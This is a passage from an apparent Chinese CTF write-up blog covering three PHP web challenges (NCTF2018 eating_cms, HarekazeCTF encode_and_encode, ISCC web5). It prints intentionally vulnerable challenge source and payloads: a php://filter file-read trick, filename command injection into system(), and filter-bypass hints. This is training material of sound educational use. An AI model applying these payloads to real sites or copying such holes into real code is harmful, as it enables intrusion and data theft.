= sql_query($sql);</span><br><span class="line">    <span class="keyword">return</span> $mysqli-&gt;insert_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">    Header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>试着读取ffffllllaaaaggg，但是他已经过滤了，但是parse_url有问题，所以我们可以写：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</span><br></pre></td></tr></table></figure>

<p>读过去发现m4aaannngggeee，再之后可以发现templates/upload.html，上传一些就能发现是个假的，但是我们可以知道有upllloadddd.php，估摸着就是没在templates这个文件夹下（说实话我不知道这有什么意义- -？）</p>
<p>回到user.php读取upload的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;</span><br><span class="line">$filename = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:not an upload file锛�&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file upload success&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $filename;</span><br><span class="line">$picdata = system(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.$picdata.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现可以命令执行，于是随便上传个东西过去改文件名就可以：</p>
<p><img src="NCTF2018_eating_cms/image-20210426214147334.png" alt="image-20210426214147334"></p>
<p>发现不能用../去读取，所以用之前提到的知识点就好</p>
<p><img src="NCTF2018_eating_cms/image-20210426214256593.png" alt="image-20210426214256593"></p>
<p>读取flag得到</p>
]]></content>
      <tags>
        <tag>php</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>encode_and_encode</title>
    <url>/2021/04/21/encode-and-encode/</url>
    <content><![CDATA[<h1 id="题目思路："><a href="#题目思路：" class="headerlink" title="题目思路："></a>题目思路：</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">    $banword = [</span><br><span class="line">        <span class="comment">// no path traversal</span></span><br><span class="line">        <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">        <span class="comment">// no stream wrapper</span></span><br><span class="line">        <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">        <span class="comment">// no data exfiltration</span></span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    $page = $json[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    $content = file_get_contents($page);</span><br><span class="line"><span class="comment">//    echo $content;</span></span><br><span class="line">    <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">        $content = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $content = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>



<p>绕过思路：</p>
<p>​    可以利用\u 来绕过字符串限制，利用伪协议流读取文件数据</p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>JSON</tag>
      </tags>
  </entry>
  <entry>
    <title>web5</title>
    <url>/2021/05/01/web5/</url>
    <content><![CDATA[<p>没想到反序列化还可以这样操作，学习到了奥</p>
<p>开局能找出源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">set_time_limit(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">$status = <span class="string">&quot;new&quot;</span>;</span><br><span class="line">$cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$is_unser_finished = <span class="literal">false</span>;</span><br><span class="line">$iscc_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = (count($_FILES) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $iscc_file;</span><br><span class="line">        $status = <span class="string">&quot;upload_fail&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ($is_upload) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">                $GLOBALS[$key] = $value;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(is_uploaded_file($iscc_file[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                $check = @getimagesize($iscc_file[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    $target_dir = <span class="string">&quot;/var/tmp/&quot;</span>;</span><br><span class="line">                    $target_file = $target_dir . randstr(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;想啥呢？有东西了……&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ($iscc_file[<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;东西塞不进去~&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file($iscc_file[<span class="string">&quot;tmp_name&quot;</span>], $target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;我拿到了！&lt;br&gt;&quot;</span>;</span><br><span class="line">                        $iscc_file = $target_file;</span><br><span class="line">                        $status = <span class="string">&quot;upload_ok&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;拿不到:(&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    finalize();</span><br><span class="line">                    <span class="keyword">exit</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你真是个天才!&lt;br&gt;&quot;</span>;</span><br><span class="line">                finalize();</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $new_cmd = <span class="string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&quot;你这罐子是空的!&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_string(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&#x27;东西都没给对!&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $status = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">            $cmd = <span class="keyword">$this</span>-&gt;new_cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;login();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $flag = file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        $pAssM0rd = hash(<span class="string">&quot;sha256&quot;</span>, $flag);</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">&#x27;pAssM0rd&#x27;</span>] === $pAssM0rd)</span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;isccIsCciScc1scc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_TellMeTruth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;看看你干的好事: <span class="subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $is_unser_finished;</span><br><span class="line">        $status = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($is_unser_finished === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">            @system($cmd);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randstr</span>(<span class="params">$len</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $characters = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;</span><br><span class="line">    $randstring = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $randstring .= $characters[rand(<span class="number">0</span>, strlen($characters))];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randstring;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos($s, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $is_upload = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">    @unlink($iscc_file);</span><br><span class="line">    $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>])) &#123;</span><br><span class="line">    $whatareyounongshane = $_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> ($whatareyounongshane) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;src&quot;</span>:</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;想越级干好事？还是有门的……&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;几辈子积累的好运就在这时~:p&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">            $resp = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;form action=<span class="string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;iscc_file&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload Image&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">EOF;</span><br><span class="line">            <span class="keyword">echo</span> $resp;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;tellmetruth&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;空空如也就是我！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;?&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    $wtf = waf($_GET&#123;<span class="string">&#x27;?&#x27;</span>&#125;) ? $_GET[<span class="string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="keyword">die</span>(<span class="string">&quot;试试就“逝世”!&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($goodshit = @unserialize($wtf)) &#123;</span><br><span class="line">        $is_unser_finished = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array($status, <span class="keyword">array</span>(<span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;upload_ok&#x27;</span>, <span class="string">&#x27;upload_fail&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>), <span class="literal">true</span>))</span><br><span class="line">        finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ISCC finder system - which is the <span class="literal">true</span> ISCC&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        * &#123;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        canvas &#123;</span><br><span class="line">            display: block;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">#snowfall &#123;</span></span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            height: <span class="number">100</span>vh;</span><br><span class="line">            background: cornflowerblue;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">████████████▒▒▒▒▒▒▒▒██████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒████████████▒▒</span><br><span class="line">████████████▒▒▒▒████████████████▒▒▒▒▒▒▒▒▒▒▒▒██████████████████▒▒▒▒▒▒▒▒██████████████████</span><br><span class="line">▒▒▒▒████▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒████████▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒████████▒▒▒▒▒▒▒▒▒▒██</span><br><span class="line">▒▒▒▒████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span class="line">▒▒▒▒████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span class="line">▒▒▒▒████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span class="line">▒▒▒▒████▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span class="line">▒▒▒▒████▒▒▒▒▒▒▒▒▒▒████████▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span class="line">▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒██████████▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span class="line">▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span class="line">▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><br><span 